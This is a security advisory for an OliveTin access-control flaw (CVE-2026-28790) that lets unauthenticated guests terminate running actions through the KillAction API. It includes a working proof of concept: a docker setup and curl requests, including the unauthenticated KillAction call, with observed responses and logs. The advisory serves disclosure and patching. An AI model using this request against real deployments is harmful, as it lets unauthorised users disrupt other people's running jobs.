# OliveTin has Unauthenticated Action Termination via KillAction When Guests Must Login

**GHSA**: GHSA-4fqm-6fmh-82mq | **CVE**: CVE-2026-28790 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-284, CWE-862, CWE-863

**Affected Packages**:
- **github.com/OliveTin/OliveTin** (go): < 0.0.0-20260302002902-d9804182eae4

## Description

### Summary

OliveTin allows an unauthenticated guest to terminate running actions through KillAction even when authRequireGuestsToLogin: true is enabled. In the tested release (3000.10.2), guests are correctly blocked from dashboard access, but an still call the KillAction RPC directly and successfully stop a running action. This is a broken access control issue that causes unauthorized denial of service against legitimate action executions.




### Details
The issue is caused by inconsistent authorization enforcement between dashboard access and action-control RPCs.

  KillAction() authenticates the caller and applies only the per-action kill ACL check:

  - service/internal/api/api.go:62

  However, it does not enforce the guest login requirement. The guest/login gate exists separately in:

  - service/internal/api/api.go:474

  That gate is used by dashboard-style methods, but not by KillAction.

  In addition, when authRequireGuestsToLogin is enabled, config sanitization disables guest view, exec, and logs permissions, but leaves kill unchanged:

  - service/internal/config/sanitize.go:160

  Specifically:

  - DefaultPermissions.View = false
  - DefaultPermissions.Exec = false
  - DefaultPermissions.Logs = false
  - DefaultPermissions.Kill remains unchanged

  As a result, in the default configuration path where Kill remains allowed, an unauthenticated guest user can still satisfy IsAllowedKill():

  - service/internal/acl/acl.go:133

  I validated this behavior on a clean 3000.10.2 setup:

  - guests were denied access to GetDashboard
  - an authenticated admin user started a long-running action
  - an unauthenticated guest successfully called KillAction
  - the action was terminated

  This confirms a real authorization bypass affecting action termination.


### PoC
 Tested version:
```
  3000.10.2
```
  1. Create a minimal config:
```bash
  mkdir -p /tmp/olivetin-kill-bypass
  cat > /tmp/olivetin-kill-bypass/config.yaml <<'YAML'
  listenAddressSingleHTTPFrontend: 0.0.0.0:1337
  logLevel: "DEBUG"
  checkForUpdates: false

  authRequireGuestsToLogin: true
  authLocalUsers:
    enabled: true
    users:
      - username: "admin"
        usergroup: "admin"
        password: "$argon2id$v=19$m=65536,t=4,p=2$JLk85PhCL7RPboAlsYO4Lw$bQj6uhKnBpisbGRhe271cEt59S9EqYrHKeCfykypbZ4"

  accessControlLists:
    - name: adminall
      addToEveryAction: true
      matchUsernames: ["admin"]
      permissions:
        view: true
        exec: true
        logs: true
        kill: true

  actions:
    - title: long-running
      id: long-running
      shell: sleep 20
      timeout: 30
  YAML
```
  2. Start OliveTin 3000.10.2:
```bash
  docker rm -f olivetin-kill-bypass 2>/dev/null || true
  docker run -d --name olivetin-kill-bypass \
    -p 1347:1337 \
    -v /tmp/olivetin-kill-bypass:/config:ro \
    ghcr.io/olivetin/olivetin:3000.10.2
```
  3. Confirm the server is ready:
```bash
  curl -i http://127.0.0.1:1347/readyz
```
  4. Prove guests are blocked from dashboard access:
```bash
  curl -i -X POST http://127.0.0.1:1347/api/GetDashboard \
    -H 'Content-Type: application/json' \
    --data '{"title":"default"}'

  Observed response:

  HTTP/1.1 403 Forbidden
  {"code":"permission_denied","message":"guests are not allowed to access the dashboard"}
```
  5. Log in as admin:
```bash
  curl -c /tmp/ot_admin_cookie.txt -i -X POST http://127.0.0.1:1347/api/LocalUserLogin \
    -H 'Content-Type: application/json' \
    --data '{"username":"admin","password":"SecretPass123!"}'
```
  6. Start a long-running action as admin:
```bash
  curl -i -b /tmp/ot_admin_cookie.txt -X POST http://127.0.0.1:1347/api/StartAction \
    -H 'Content-Type: application/json' \
    --data '{"bindingId":"long-running","arguments":[],"uniqueTrackingId":"kill-hunt-1"}'

  Observed response:

  HTTP/1.1 200 OK
  {"executionTrackingId":"kill-hunt-1"}
```
  7. Kill it as an unauthenticated guest:
```bash
  curl -i -X POST http://127.0.0.1:1347/api/KillAction \
    -H 'Content-Type: application/json' \
    --data '{"executionTrackingId":"kill-hunt-1"}'
```
  Observed response:
```bash
  HTTP/1.1 200 OK
  {"executionTrackingId":"kill-hunt-1","killed":true,"alreadyCompleted":false,"found":true}
```
  8. Confirm in container logs:
```bash
  docker logs olivetin-kill-bypass 2>&1 | tail -n 120
```
  Observed relevant lines:
```bash
  Authenticated API request ... path="/olivetin.api.v1.OliveTinApiService/GetDashboard" ... username="guest"
  Authenticated API request ... path="/olivetin.api.v1.OliveTinApiService/StartAction" ... username="admin"
  Action started actionTitle="long-running"
  Authenticated API request ... path="/olivetin.api.v1.OliveTinApiService/KillAction" ... username="guest"
  Killing execution request by tracking ID: kill-hunt-1
  Action finished actionTitle="long-running" exit="-1"
```
  This proves:

  - guests are denied dashboard access
  - guests can still invoke KillAction
  - the running action is successfully terminated by an unauthenticated user


### Impact
This is an unauthenticated broken access control vulnerability resulting in denial of service.

  An unauthenticated guest can:

  - terminate active jobs started by legitimate users
  - disrupt long-running administrative or operational workflows
  - interfere with privileged actions without being allowed to log in

  Who is impacted:

  - OliveTin deployments with authRequireGuestsToLogin: true
  - multi-user environments where actions may run for meaningful durations
  - operational environments where stopping a running action can interrupt maintenance, deployment, backup, or service-control tasks

  This issue does not require valid credentials, only knowledge of a live executionTrackingId. That still makes it a real and exploitable availability issue in environments where execution identifiers can be observed or predicted
  through adjacent leaks or shared operator knowledge.
